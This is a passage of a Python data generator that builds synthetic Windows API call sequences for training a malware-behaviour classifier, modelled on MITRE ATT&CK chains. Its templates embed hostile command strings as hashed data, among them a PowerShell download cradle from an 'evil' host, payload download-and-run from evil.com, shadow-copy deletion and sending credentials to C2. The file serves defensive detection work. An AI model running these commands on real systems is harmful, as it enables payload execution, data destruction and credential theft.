"""
Behavioral API Sequence Data Generator
=======================================

Generates realistic synthetic API call sequences for training the
CortexBehavioralNet 1D-CNN classifier across 20 malware behavioural
categories.

Each sample is a tensor of shape ``(sequence_length, 4)`` where the four
feature columns are:

* **api_id** — deterministic hash of the Windows API name mod 2000
* **arg_hash** — deterministic hash of typical argument patterns
* **retval** — 0 for success, NTSTATUS / Win32 error codes for failures
* **delta_ms** — inter-call timing drawn from a log-normal distribution

Attack-chain templates are modelled on MITRE ATT&CK technique
observations (T1055, T1486, T1003, T1021, T1547, etc.) and each
category contains 5-10 distinct chain variants.  Configurable noise
injection (benign API calls), failure rates, timing jitter, and
class-distribution controls allow the generator to produce arbitrarily
large datasets suitable for enterprise model training.

Usage
-----
::

    from PhantomCortex.training.data.behavioral_generator import (
        BehavioralDataGenerator,
        GeneratorConfig,
    )

    cfg = GeneratorConfig(samples_per_class=5000, seed=42)
    gen = BehavioralDataGenerator(cfg)
    train_dl, val_dl, test_dl, class_weights = gen.generate_dataloaders()
"""

from __future__ import annotations

import hashlib
import logging
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Optional, Sequence

import numpy as np
import torch
from numpy.typing import NDArray
from torch.utils.data import DataLoader, TensorDataset

logger = logging.getLogger("PhantomCortex.Data.BehavioralGenerator")

# ═══════════════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════════════

API_VOCABULARY_SIZE: int = 2000
"""Hash-space ceiling for API name → integer mapping."""

_MAX_SEQUENCE_LENGTH: int = 4096
"""Hard upper bound to reject nonsensical configuration."""

_MAX_SAMPLES_PER_CLASS: int = 500_000
"""Safety cap on per-class sample count."""


# ═══════════════════════════════════════════════════════════════════════════
# Behaviour categories — mirrors BehaviorCategory in behavioral_cnn.py
# ═══════════════════════════════════════════════════════════════════════════

class BehaviorCategory(IntEnum):
    """Twenty behavioural categories for API sequence classification."""

    ProcessInjection = 0
    Ransomware = 1
    InfoStealer = 2
    Backdoor = 3
    Rootkit = 4
    Downloader = 5
    Dropper = 6
    Worm = 7
    Miner = 8
    Adware = 9
    Keylogger = 10
    RAT = 11
    BankTrojan = 12
    Spyware = 13
    Fileless = 14
    LateralMovement = 15
    Exfiltration = 16
    Persistence = 17
    PrivEsc = 18
    Benign = 19


NUM_CLASSES: int = len(BehaviorCategory)


# ═══════════════════════════════════════════════════════════════════════════
# Deterministic hashing helpers (consistent with behavioral_features.py)
# ═══════════════════════════════════════════════════════════════════════════

def _stable_api_id(api_name: str) -> int:
    """Return a deterministic integer in [0, API_VOCABULARY_SIZE) for *api_name*."""
    digest = hashlib.sha256(api_name.lower().encode("utf-8", errors="replace")).digest()
    return int.from_bytes(digest[:8], "little") % API_VOCABULARY_SIZE


def _stable_arg_hash(arg_description: str) -> int:
    """Return a deterministic integer in [0, API_VOCABULARY_SIZE) for an argument pattern."""
    digest = hashlib.sha256(arg_description.encode("utf-8", errors="replace")).digest()
    return int.from_bytes(digest[:8], "little") % API_VOCABULARY_SIZE


# Pre-compute API IDs for every Windows API referenced across all templates
# so the hot path avoids repeated SHA-256 calls.
_API_ID_CACHE: dict[str, int] = {}


def _get_api_id(name: str) -> int:
    cached = _API_ID_CACHE.get(name)
    if cached is not None:
        return cached
    val = _stable_api_id(name)
    _API_ID_CACHE[name] = val
    return val


# ═══════════════════════════════════════════════════════════════════════════
# Common Windows error codes injected on ~5 % of calls.
#
# IMPORTANT:  Values are stored as *categorical indices* (1–11) rather
# than raw Win32 / NTSTATUS codes.  Raw NTSTATUS values such as
# 0xC0000005 (3 221 225 477) overflow float16 during AMP training
# (max ≈ 65 504) and propagate NaN through the entire gradient graph.
# Since error codes are *categorical* (ACCESS_DENIED is not "more than"
# FILE_NOT_FOUND), ordinal magnitude is meaningless — small integer IDs
# preserve all discriminative power.
# ═══════════════════════════════════════════════════════════════════════════

_COMMON_ERROR_IDS: list[int] = [
    1,   # ERROR_ACCESS_DENIED         (Win32 5)
    2,   # ERROR_FILE_NOT_FOUND        (Win32 2)
    3,   # ERROR_PATH_NOT_FOUND        (Win32 3)
    4,   # ERROR_INVALID_HANDLE        (Win32 6)
    5,   # ERROR_INVALID_PARAMETER     (Win32 87)
    6,   # ERROR_INSUFFICIENT_BUFFER   (Win32 122)
    7,   # ERROR_PRIVILEGE_NOT_HELD    (Win32 1314)
    8,   # STATUS_ACCESS_VIOLATION     (NTSTATUS 0xC0000005)
    9,   # STATUS_INVALID_PARAMETER    (NTSTATUS 0xC000000D)
    10,  # STATUS_ACCESS_DENIED        (NTSTATUS 0xC0000022)
    11,  # STATUS_OBJECT_NAME_NOT_FOUND (NTSTATUS 0xC0000034)
]

RETURN_CODE_VOCABULARY_SIZE: int = 12
"""Feature 2 vocabulary size: 0 = success, 1–11 = categorised error codes."""

# ═══════════════════════════════════════════════════════════════════════════
# Benign "noise" API pool — calls commonly observed in normal applications
# ═══════════════════════════════════════════════════════════════════════════

_BENIGN_NOISE_APIS: list[tuple[str, str]] = [
    ("GetTickCount", ""),
    ("QueryPerformanceCounter", "lpPerformanceCount=out"),
    ("GetLastError", ""),
    ("GetCurrentThreadId", ""),
    ("GetCurrentProcessId", ""),
    ("GetSystemTimeAsFileTime", "lpSystemTimeAsFileTime=out"),
    ("TlsGetValue", "dwTlsIndex=0"),
    ("TlsSetValue", "dwTlsIndex=0,lpTlsValue=ptr"),
    ("NtQueryInformationThread", "ThreadHandle=current"),
    ("HeapAlloc", "hHeap=default,dwBytes=256"),
    ("HeapFree", "hHeap=default,lpMem=ptr"),
    ("EnterCriticalSection", "lpCriticalSection=ptr"),
    ("LeaveCriticalSection", "lpCriticalSection=ptr"),
    ("RtlEnterCriticalSection", "lpCriticalSection=ptr"),
    ("RtlLeaveCriticalSection", "lpCriticalSection=ptr"),
    ("CloseHandle", "hObject=handle"),
    ("GetModuleHandleA", "lpModuleName=kernel32.dll"),
    ("GetModuleHandleW", "lpModuleName=kernel32.dll"),
    ("GetProcAddress", "hModule=handle,lpProcName=func"),
    ("LoadLibraryA", "lpLibFileName=user32.dll"),
    ("LoadLibraryW", "lpLibFileName=user32.dll"),
    ("SetLastError", "dwErrCode=0"),
    ("IsDebuggerPresent", ""),
    ("OutputDebugStringA", "lpOutputString=debug"),
    ("Sleep", "dwMilliseconds=10"),
    ("WaitForSingleObject", "hHandle=event,dwMilliseconds=100"),
    ("ReleaseMutex", "hMutex=handle"),
    ("InitializeCriticalSection", "lpCriticalSection=ptr"),
    ("DeleteCriticalSection", "lpCriticalSection=ptr"),
    ("FlushFileBuffers", "hFile=stdout"),
]


# ═══════════════════════════════════════════════════════════════════════════
# Chain templates per category
# ═══════════════════════════════════════════════════════════════════════════
# Each template is a list of (api_name, arg_description) tuples defining
# one repeating "core" chain.  The generator tiles chains, interleaves
# noise, and adds timing jitter to fill the requested sequence length.

ChainTemplate = list[tuple[str, str]]

# fmt: off

_TEMPLATES: dict[int, list[ChainTemplate]] = {

    # ── 0  ProcessInjection — MITRE T1055 ────────────────────────────
    BehaviorCategory.ProcessInjection: [
        # Classic: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
        [
            ("OpenProcess", "dwDesiredAccess=PROCESS_ALL_ACCESS,dwProcessId=1234"),
            ("VirtualAllocEx", "hProcess=remote,dwSize=4096,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=remote,lpBaseAddress=alloc,nSize=4096"),
            ("CreateRemoteThread", "hProcess=remote,lpStartAddress=alloc"),
        ],
        # NtCreateThreadEx variant
        [
            ("NtOpenProcess", "ProcessHandle=out,DesiredAccess=PROCESS_ALL_ACCESS"),
            ("NtAllocateVirtualMemory", "ProcessHandle=remote,RegionSize=8192"),
            ("NtWriteVirtualMemory", "ProcessHandle=remote,BaseAddress=alloc,BufferSize=8192"),
            ("NtCreateThreadEx", "ThreadHandle=out,ProcessHandle=remote,StartRoutine=alloc"),
        ],
        # APC injection
        [
            ("OpenProcess", "dwDesiredAccess=PROCESS_ALL_ACCESS,dwProcessId=5678"),
            ("VirtualAllocEx", "hProcess=remote,dwSize=4096,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=remote,lpBaseAddress=alloc,nSize=4096"),
            ("OpenThread", "dwDesiredAccess=THREAD_ALL_ACCESS,dwThreadId=9012"),
            ("QueueUserAPC", "pfnAPC=alloc,hThread=remote"),
        ],
        # NtMapViewOfSection (process hollowing)
        [
            ("NtCreateSection", "SectionHandle=out,DesiredAccess=SECTION_ALL_ACCESS"),
            ("NtMapViewOfSection", "SectionHandle=section,ProcessHandle=remote"),
            ("NtWriteVirtualMemory", "ProcessHandle=remote,BaseAddress=mapped,BufferSize=4096"),
            ("NtUnmapViewOfSection", "ProcessHandle=current,BaseAddress=local"),
            ("NtResumeThread", "ThreadHandle=remote"),
        ],
        # SetThreadContext hijack
        [
            ("OpenProcess", "dwDesiredAccess=PROCESS_ALL_ACCESS,dwProcessId=3456"),
            ("VirtualAllocEx", "hProcess=remote,dwSize=4096,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=remote,lpBaseAddress=alloc,nSize=4096"),
            ("OpenThread", "dwDesiredAccess=THREAD_ALL_ACCESS,dwThreadId=7890"),
            ("SuspendThread", "hThread=remote"),
            ("GetThreadContext", "hThread=remote,lpContext=out"),
            ("SetThreadContext", "hThread=remote,lpContext=modified"),
            ("ResumeThread", "hThread=remote"),
        ],
        # Early bird APC
        [
            ("CreateProcessW", "lpCommandLine=svchost.exe,dwCreationFlags=CREATE_SUSPENDED"),
            ("VirtualAllocEx", "hProcess=child,dwSize=8192,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=child,lpBaseAddress=alloc,nSize=8192"),
            ("QueueUserAPC", "pfnAPC=alloc,hThread=child_main"),
            ("ResumeThread", "hThread=child_main"),
        ],
        # Atom bombing (GlobalAddAtom + NtQueueApcThread)
        [
            ("GlobalAddAtomA", "lpString=shellcode_encoded"),
            ("OpenProcess", "dwDesiredAccess=PROCESS_ALL_ACCESS,dwProcessId=2222"),
            ("NtQueueApcThread", "ThreadHandle=remote,ApcRoutine=GlobalGetAtomNameA"),
            ("NtQueueApcThread", "ThreadHandle=remote,ApcRoutine=memcpy_gadget"),
            ("NtQueueApcThread", "ThreadHandle=remote,ApcRoutine=exec_gadget"),
        ],
    ],

    # ── 1  Ransomware — MITRE T1486 ─────────────────────────────────
    BehaviorCategory.Ransomware: [
        # Classic CryptoAPI chain
        [
            ("FindFirstFileW", "lpFileName=C:\\Users\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=target.docx,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("CryptAcquireContextW", "phProv=out,dwProvType=PROV_RSA_AES"),
            ("CryptGenKey", "hProv=ctx,Algid=CALG_AES_256"),
            ("CryptEncrypt", "hKey=key,hHash=0,Final=TRUE,dwBufLen=65536"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
            ("CloseHandle", "hObject=handle"),
            ("DeleteFileW", "lpFileName=target.docx"),
        ],
        # BCrypt variant
        [
            ("FindFirstFileW", "lpFileName=D:\\Documents\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=report.xlsx,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=131072"),
            ("BCryptOpenAlgorithmProvider", "phAlgorithm=out,pszAlgId=AES"),
            ("BCryptGenerateSymmetricKey", "hAlgorithm=aes,phKey=out"),
            ("BCryptEncrypt", "hKey=key,cbInput=131072"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=131072"),
            ("MoveFileW", "lpExistingFileName=report.xlsx,lpNewFileName=report.xlsx.locked"),
        ],
        # Volume shadow deletion + encryption
        [
            ("CreateProcessW", "lpCommandLine=vssadmin delete shadows /all /quiet"),
            ("WaitForSingleObject", "hHandle=process,dwMilliseconds=30000"),
            ("FindFirstFileW", "lpFileName=E:\\*.*"),
            ("CreateFileW", "lpFileName=photo.jpg,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("CryptAcquireContextW", "phProv=out,dwProvType=PROV_RSA_AES"),
            ("CryptDeriveKey", "hProv=ctx,Algid=CALG_AES_256,hBaseData=hash"),
            ("CryptEncrypt", "hKey=key,hHash=0,Final=TRUE,dwBufLen=65536"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
        ],
        # Ransom note drop
        [
            ("FindFirstFileW", "lpFileName=C:\\Users\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=document.pdf,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("GetFileSize", "hFile=handle"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=32768"),
            ("CryptEncrypt", "hKey=key,hHash=0,Final=TRUE,dwBufLen=32768"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=32768"),
            ("CreateFileW", "lpFileName=README_RESTORE.txt,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=note,nNumberOfBytesToWrite=2048"),
        ],
        # Fast partial encryption (first 1 MB only)
        [
            ("FindFirstFileW", "lpFileName=F:\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=database.mdf,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("SetFilePointer", "hFile=handle,lDistanceToMove=0"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=1048576"),
            ("CryptEncrypt", "hKey=key,hHash=0,Final=FALSE,dwBufLen=1048576"),
            ("SetFilePointer", "hFile=handle,lDistanceToMove=0"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=1048576"),
            ("SetEndOfFile", "hFile=handle"),
        ],
        # Spread + encrypt
        [
            ("NetShareEnum", "servername=\\\\server,level=1"),
            ("WNetAddConnection2W", "lpRemoteName=\\\\server\\share"),
            ("FindFirstFileW", "lpFileName=\\\\server\\share\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=\\\\server\\share\\data.csv,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("CryptEncrypt", "hKey=key,hHash=0,Final=TRUE,dwBufLen=65536"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
        ],
    ],

    # ── 2  InfoStealer — MITRE T1003, T1555, T1552 ──────────────────
    BehaviorCategory.InfoStealer: [
        # Browser credential theft
        [
            ("RegOpenKeyExW", "hKey=HKCU,lpSubKey=Software\\Google\\Chrome"),
            ("RegQueryValueExW", "lpValueName=InstallLocation"),
            ("CreateFileW", "lpFileName=Login Data,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("CryptUnprotectData", "pDataIn=blob"),
            ("connect", "sockaddr=C2_server:443"),
            ("send", "buf=credentials,len=4096"),
        ],
        # Clipboard + keylog
        [
            ("OpenClipboard", "hWndNewOwner=NULL"),
            ("GetClipboardData", "uFormat=CF_TEXT"),
            ("CloseClipboard", ""),
            ("GetAsyncKeyState", "vKey=VK_A"),
            ("GetAsyncKeyState", "vKey=VK_RETURN"),
            ("CreateFileW", "lpFileName=keylog.dat,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=1024"),
        ],
        # Registry credential harvest
        [
            ("RegOpenKeyExW", "hKey=HKLM,lpSubKey=SAM\\SAM\\Domains\\Account"),
            ("RegQueryValueExW", "lpValueName=F"),
            ("RegOpenKeyExW", "hKey=HKLM,lpSubKey=SECURITY\\Policy\\Secrets"),
            ("RegQueryValueExW", "lpValueName=DefaultPassword"),
            ("connect", "sockaddr=exfil_server:8443"),
            ("send", "buf=registry_dump,len=8192"),
        ],
        # Email client theft
        [
            ("RegOpenKeyExW", "hKey=HKCU,lpSubKey=Software\\Microsoft\\Office\\Outlook"),
            ("RegQueryValueExW", "lpValueName=PST"),
            ("CreateFileW", "lpFileName=outlook.pst,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=262144"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=pst_data,len=262144"),
        ],
        # Crypto wallet theft
        [
            ("CreateFileW", "lpFileName=AppData\\Roaming\\Ethereum\\keystore,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=4096"),
            ("CreateFileW", "lpFileName=AppData\\Roaming\\Bitcoin\\wallet.dat,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("connect", "sockaddr=C2:8080"),
            ("send", "buf=wallet_data,len=69632"),
        ],
        # MiniDumpWriteDump credential dump (T1003.001)
        [
            ("OpenProcess", "dwDesiredAccess=PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,dwProcessId=lsass"),
            ("CreateFileW", "lpFileName=dump.dmp,dwDesiredAccess=GENERIC_WRITE"),
            ("MiniDumpWriteDump", "hProcess=lsass,hFile=dump"),
            ("ReadFile", "hFile=dump_handle,nNumberOfBytesToRead=1048576"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=dump_contents,len=1048576"),
        ],
    ],

    # ── 3  Backdoor — MITRE T1059, T1071 ────────────────────────────
    BehaviorCategory.Backdoor: [
        # Classic reverse shell
        [
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("socket", "af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP"),
            ("connect", "sockaddr=C2:4444"),
            ("recv", "buf=command,len=4096"),
            ("CreateProcessW", "lpCommandLine=cmd.exe /c <command>"),
            ("ReadFile", "hFile=stdout_pipe,nNumberOfBytesToRead=4096"),
            ("send", "buf=output,len=4096"),
        ],
        # Named pipe backdoor
        [
            ("CreateNamedPipeW", "lpName=\\\\.\\pipe\\svchost_update"),
            ("ConnectNamedPipe", "hNamedPipe=pipe"),
            ("ReadFile", "hFile=pipe,nNumberOfBytesToRead=4096"),
            ("CreateProcessW", "lpCommandLine=powershell.exe -enc <payload>"),
            ("ReadFile", "hFile=stdout_pipe,nNumberOfBytesToRead=8192"),
            ("WriteFile", "hFile=pipe,nNumberOfBytesToWrite=8192"),
        ],
        # HTTP C2 channel
        [
            ("InternetOpenW", "lpszAgent=Mozilla/5.0"),
            ("InternetConnectW", "lpszServerName=updates.legit-domain.com,nServerPort=443"),
            ("HttpOpenRequestW", "lpszVerb=POST,lpszObjectName=/api/beacon"),
            ("HttpSendRequestW", "lpszHeaders=Content-Type:application/json"),
            ("InternetReadFile", "hFile=response,lpdwNumberOfBytesRead=4096"),
            ("CreateProcessW", "lpCommandLine=cmd.exe /c <tasklist>"),
            ("send", "buf=sysinfo,len=2048"),
        ],
        # DNS-over-HTTPS C2
        [
            ("WinHttpOpen", "pszAgentW=WinHTTP/1.0"),
            ("WinHttpConnect", "pswzServerName=dns.google,nServerPort=443"),
            ("WinHttpOpenRequest", "pwszVerb=GET,pwszObjectName=/resolve?name=cmd.c2.io&type=TXT"),
            ("WinHttpSendRequest", "dwHeadersLength=0"),
            ("WinHttpReceiveResponse", "hRequest=req"),
            ("WinHttpReadData", "hRequest=req,lpBuffer=response,dwNumberOfBytesToRead=4096"),
            ("CreateProcessW", "lpCommandLine=cmd.exe /c <decoded_cmd>"),
        ],
        # WMI backdoor
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_WbemLocator"),
            ("IWbemLocator_ConnectServer", "strNetworkResource=root\\cimv2"),
            ("IWbemServices_ExecMethod", "strObjectPath=Win32_Process,strMethodName=Create"),
            ("recv", "buf=next_command,len=4096"),
        ],
        # Scheduled task persistence + beacon
        [
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("socket", "af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP"),
            ("connect", "sockaddr=C2:443"),
            ("recv", "buf=command,len=2048"),
            ("CreateProcessW", "lpCommandLine=schtasks /create /tn update /tr payload.exe /sc minute"),
            ("send", "buf=task_created,len=32"),
        ],
    ],

    # ── 4  Rootkit — MITRE T1014 ────────────────────────────────────
    BehaviorCategory.Rootkit: [
        # Kernel driver load
        [
            ("OpenSCManagerW", "dwDesiredAccess=SC_MANAGER_ALL_ACCESS"),
            ("CreateServiceW", "lpServiceName=sysdrv,dwServiceType=SERVICE_KERNEL_DRIVER"),
            ("StartServiceW", "hService=sysdrv"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_HIDE_PROCESS"),
        ],
        # NtLoadDriver variant
        [
            ("NtOpenProcess", "ProcessHandle=out,DesiredAccess=PROCESS_ALL_ACCESS"),
            ("RegCreateKeyExW", "hKey=HKLM,lpSubKey=SYSTEM\\CurrentControlSet\\Services\\rootdrv"),
            ("RegSetValueExW", "lpValueName=ImagePath,lpData=\\??\\C:\\rootdrv.sys"),
            ("NtLoadDriver", "DriverServiceName=\\Registry\\Machine\\SYSTEM\\CCS\\Services\\rootdrv"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_HIDE_FILE"),
        ],
        # DKOM — Direct Kernel Object Manipulation
        [
            ("NtOpenProcess", "ProcessHandle=out,DesiredAccess=PROCESS_ALL_ACCESS"),
            ("NtQuerySystemInformation", "SystemInformationClass=SystemModuleInformation"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_UNLINK_EPROCESS"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_HIDE_REGISTRY_KEY"),
        ],
        # Minifilter — filesystem hiding
        [
            ("CreateFileW", "lpFileName=\\\\.\\ShadowFilter"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_REGISTER_FILTER"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_ADD_HIDE_RULE"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_ACTIVATE_FILTER"),
        ],
        # Bootkit-style (MBR)
        [
            ("CreateFileW", "lpFileName=\\\\.\\PhysicalDrive0,dwDesiredAccess=GENERIC_READ|GENERIC_WRITE"),
            ("ReadFile", "hFile=disk,nNumberOfBytesToRead=512"),
            ("WriteFile", "hFile=disk,nNumberOfBytesToWrite=512"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_DISK_SET_PARTITION_INFO"),
        ],
    ],

    # ── 5  Downloader — MITRE T1105 ─────────────────────────────────
    BehaviorCategory.Downloader: [
        # URLDownloadToFile
        [
            ("URLDownloadToFileW", "szURL=http://evil.com/payload.exe,szFileName=C:\\Temp\\payload.exe"),
            ("CreateFileW", "lpFileName=C:\\Temp\\payload.exe,dwDesiredAccess=GENERIC_READ"),
            ("GetFileSize", "hFile=handle"),
            ("CreateProcessW", "lpCommandLine=C:\\Temp\\payload.exe"),
        ],
        # WinHTTP download
        [
            ("WinHttpOpen", "pszAgentW=Updater/1.0"),
            ("WinHttpConnect", "pswzServerName=cdn.evil.com,nServerPort=443"),
            ("WinHttpOpenRequest", "pwszVerb=GET,pwszObjectName=/update.bin"),
            ("WinHttpSendRequest", "dwHeadersLength=0"),
            ("WinHttpReceiveResponse", "hRequest=req"),
            ("WinHttpReadData", "hRequest=req,lpBuffer=payload,dwNumberOfBytesToRead=262144"),
            ("CreateFileW", "lpFileName=C:\\ProgramData\\update.exe,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=262144"),
            ("CreateProcessW", "lpCommandLine=C:\\ProgramData\\update.exe"),
        ],
        # InternetOpen chain
        [
            ("InternetOpenW", "lpszAgent=MSIE"),
            ("InternetOpenUrlW", "lpszUrl=https://malware.site/stage2.dll"),
            ("InternetReadFile", "hFile=url,lpdwNumberOfBytesRead=131072"),
            ("CreateFileW", "lpFileName=C:\\Windows\\Temp\\stage2.dll,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=131072"),
            ("LoadLibraryW", "lpLibFileName=C:\\Windows\\Temp\\stage2.dll"),
        ],
        # PowerShell cradle
        [
            ("CreateProcessW", "lpCommandLine=powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil/ps')"),
            ("WaitForSingleObject", "hHandle=process,dwMilliseconds=30000"),
            ("CreateFileW", "lpFileName=C:\\Users\\Public\\dropper.exe,dwDesiredAccess=GENERIC_READ"),
            ("CreateProcessW", "lpCommandLine=C:\\Users\\Public\\dropper.exe"),
        ],
        # BITS transfer
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_BackgroundCopyManager"),
            ("CreateFileW", "lpFileName=C:\\Windows\\Temp\\bits_payload.exe,dwDesiredAccess=GENERIC_READ"),
            ("GetFileSize", "hFile=handle"),
            ("CreateProcessW", "lpCommandLine=C:\\Windows\\Temp\\bits_payload.exe"),
        ],
    ],

    # ── 6  Dropper — MITRE T1204 ────────────────────────────────────
    BehaviorCategory.Dropper: [
        # Classic temp-file drop
        [
            ("GetTempPathW", "lpBuffer=out,nBufferLength=260"),
            ("GetTempFileNameW", "lpPrefixString=drp"),
            ("CreateFileW", "lpFileName=C:\\Temp\\drp1234.exe,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
            ("CloseHandle", "hObject=handle"),
            ("WinExec", "lpCmdLine=C:\\Temp\\drp1234.exe,uCmdShow=SW_HIDE"),
        ],
        # Resource extraction dropper
        [
            ("FindResourceW", "hModule=self,lpType=RT_RCDATA"),
            ("LoadResource", "hModule=self,hResInfo=resource"),
            ("LockResource", "hResData=resource"),
            ("SizeofResource", "hModule=self,hResInfo=resource"),
            ("CreateFileW", "lpFileName=C:\\ProgramData\\svchost.exe,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=131072"),
            ("CreateProcessW", "lpCommandLine=C:\\ProgramData\\svchost.exe"),
        ],
        # DLL side-loading drop
        [
            ("GetSystemDirectoryW", "lpBuffer=out"),
            ("CopyFileW", "lpExistingFileName=legit.exe,lpNewFileName=C:\\ProgramData\\legit.exe"),
            ("CreateFileW", "lpFileName=C:\\ProgramData\\evil.dll,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
            ("CreateProcessW", "lpCommandLine=C:\\ProgramData\\legit.exe"),
        ],
        # Self-extracting archive
        [
            ("GetTempPathW", "lpBuffer=out,nBufferLength=260"),
            ("CreateDirectoryW", "lpPathName=C:\\Temp\\extracted"),
            ("CreateFileW", "lpFileName=C:\\Temp\\extracted\\payload.exe,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=262144"),
            ("CreateFileW", "lpFileName=C:\\Temp\\extracted\\config.dat,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=1024"),
            ("ShellExecuteW", "lpFile=C:\\Temp\\extracted\\payload.exe,lpParameters=--config config.dat"),
        ],
        # Drop + delete self
        [
            ("GetModuleFileNameW", "hModule=NULL,lpFilename=out"),
            ("CreateFileW", "lpFileName=C:\\Users\\Public\\svc.exe,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=131072"),
            ("CreateProcessW", "lpCommandLine=C:\\Users\\Public\\svc.exe"),
            ("MoveFileExW", "lpExistingFileName=self.exe,lpNewFileName=NULL,dwFlags=MOVEFILE_DELAY_UNTIL_REBOOT"),
        ],
    ],

    # ── 7  Worm — MITRE T1021, T1080 ────────────────────────────────
    BehaviorCategory.Worm: [
        # SMB share propagation
        [
            ("NetShareEnum", "servername=\\\\target1,level=1"),
            ("WNetAddConnection2W", "lpRemoteName=\\\\target1\\C$,lpPassword=pass"),
            ("CopyFileW", "lpExistingFileName=worm.exe,lpNewFileName=\\\\target1\\C$\\worm.exe"),
            ("CreateRemoteThread", "hProcess=remote_svchost,lpStartAddress=worm_entry"),
        ],
        # PsExec-style
        [
            ("OpenSCManagerW", "lpMachineName=\\\\target2"),
            ("CreateServiceW", "lpServiceName=PSEXEC,lpBinaryPathName=\\\\target2\\ADMIN$\\worm.exe"),
            ("StartServiceW", "hService=PSEXEC"),
            ("DeleteService", "hService=PSEXEC"),
        ],
        # WMI lateral
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_WbemLocator"),
            ("IWbemLocator_ConnectServer", "strNetworkResource=\\\\target3\\root\\cimv2"),
            ("IWbemServices_ExecMethod", "strMethodName=Create,CommandLine=worm.exe"),
        ],
        # USB propagation
        [
            ("GetLogicalDriveStringsW", "lpBuffer=out"),
            ("GetDriveTypeW", "lpRootPathName=E:\\"),
            ("CopyFileW", "lpExistingFileName=worm.exe,lpNewFileName=E:\\autorun.exe"),
            ("CreateFileW", "lpFileName=E:\\autorun.inf,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=128"),
            ("SetFileAttributesW", "lpFileName=E:\\autorun.inf,dwFileAttributes=FILE_ATTRIBUTE_HIDDEN"),
        ],
        # EternalBlue-style exploit chain
        [
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("socket", "af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP"),
